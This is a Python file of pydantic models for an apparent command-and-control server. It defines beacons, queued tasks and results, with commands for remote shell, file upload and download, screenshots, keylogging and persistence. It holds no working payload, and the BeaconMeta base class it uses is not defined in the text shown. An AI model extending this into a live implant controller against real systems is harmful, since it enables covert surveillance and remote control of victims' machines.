from datetime import UTC, datetime
from enum import StrEnum

from pydantic import BaseModel, Field

class CommandType(StrEnum):
    SHELL = "shell"
    SYSINFO = "sysinfo"
    PROCLIST = "proclist"
    UPLOAD = "upload"
    DOWNLOAD = "download"
    SCREENSHOT = "screenshot"
    KEYLOG_START = "keylog_start"
    KEYLOG_STOP = "keylog_stop"
    PERSIST = "persist"
    SLEEP = "sleep"

class BeaconRecord(BeaconMeta):
    id: str
    first_seen: str
    last_seen: str


class TaskRequest(BaseModel):
    beacon_id: str
    command: CommandType
    args: str | None = None


class TaskRecord(BaseModel):
    id: str
    beacon_id: str
    command: CommandType
    args: str | None = None
    status: str = "pending"
    created_at: str = Field(default_factory = lambda: datetime.now(UTC).isoformat())
    completed_at: str | None = None


class TaskResult(BaseModel):
    id: str
    task_id: str
    output: str | None = None
    error: str | None = None
    created_at: str = Field(default_factory = lambda: datetime.now(UTC).isoformat())    